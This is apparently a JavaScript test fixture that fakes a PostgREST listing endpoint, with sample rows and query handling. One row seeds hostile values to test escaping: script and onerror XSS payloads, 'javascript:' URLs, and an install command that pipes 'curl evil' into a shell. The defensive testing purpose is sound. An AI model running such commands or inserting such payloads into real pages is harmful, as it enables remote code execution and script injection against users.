// A tiny stand-in for the PostgREST endpoint of the `public_listing` view, enough for the application's read queries:
// select, evidence_level=gte.N, or=(title.ilike.*..*,summary.ilike.*..*), slug=eq.X, order, limit, offset and Prefer: count=exact.
import http from "node:http";

export function makeListings() {
  const rows = [];
  const base = (i, over = {}) => ({
    slug: `server-${String(i).padStart(2, "0")}`, title: `Server ${String(i).padStart(2, "0")}`, summary: `Summary text number ${i}.`,
    evidence_level: 1, evidence_checked_at: "2026-10-01T00:00:00Z", published_at: "2026-10-02T00:00:00Z",
    source_links: [{ url: `https://example.org/repo-${i}`, kind: "repo", retrieved_at: "2026-10-01" }],
    facts: { repo_url: `https://example.org/repo-${i}`, license_claimed: "MIT", transports: ["stdio"], repo: { name_with_owner: `o/r${i}`, archived: false, fork: false } },
    ...over,
  });
  for (let i = 1; i <= 26; i++) rows.push(base(i));
  rows.push(base(27, { slug: "alpha-tool", title: "Alpha Tool", summary: "Finds alpha things.", evidence_level: 2 }));
  rows.push(base(28, { slug: "declared-only", title: "Declared Entry", summary: "Only declared.", evidence_level: 0 }));
  rows.push(base(29, {
    slug: "hostile", title: "<script>alert(1)</script> Hostile", summary: "<img src=x onerror=alert(1)> text",
    facts: { repo_url: "javascript:alert(1)", homepage: "https://ok.example/home", install_command: "npx hostile && curl evil | sh" },
    source_links: [{ url: "javascript:alert(2)", kind: "repo" }, { url: "https://ok.example/src", kind: "repo" }],
  }));
  return rows;
}

export function startFakePostgrest({ rows = makeListings() } = {}) {
  const state = { mode: "ok", requests: [] };
  const server = http.createServer((req, res) => {
    const url = new URL(req.url, "http://x");
    state.requests.push({ method: req.method, path: url.pathname, query: Object.fromEntries(url.searchParams) });
    if (state.mode === "down") { res.writeHead(500, { "content-type": "application/json" }); res.end('{"message":"internal secret detail db-host-1"}'); return; }
    if (url.pathname !== "/rest/v1/public_listing") { res.writeHead(404); res.end("{}"); return; }
    let out = rows;
    const gte = url.searchParams.get("evidence_level");
    if (gte?.startsWith("gte.")) out = out.filter((r) => r.evidence_level >= Number(gte.slice(4)));
    const slug = url.searchParams.get("slug");
    if (slug?.startsWith("eq.")) out = out.filter((r) => r.slug === slug.slice(3));
    const or = url.searchParams.get("or");
    if (or) {
      const terms = [...or.matchAll(/(?:title|summary)\.ilike\.%(.*?)%/g)].map((m) => m[1].toLowerCase());
      out = out.filter((r) => terms.some((t) => r.title.toLowerCase().includes(t) || r.summary.toLowerCase().includes(t)));
    }
    out = [...out].sort((a, b) => (a.title < b.title ? -1 : a.title > b.title ? 1 : 0));
    const total = out.length;
    const offset = Number(url.searchParams.get("offset") || 0);
    const limit = url.searchParams.get("limit");
    out = out.slice(offset, limit ? offset + Number(limit) : undefined);
    const select = url.searchParams.get("select");
    if (select && select !== "*") out = out.map((r) => Object.fromEntries(select.split(",").map((c) => [c, r[c]])));
    res.writeHead(200, { "content-type": "application/json", "content-range": `${total ? offset : "*"}-${offset + out.length - 1}/${total}` });
    res.end(JSON.stringify(out));
  });
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve({ server, state, port: server.address().port, close: () => new Promise((r) => server.close(r)) })));
}
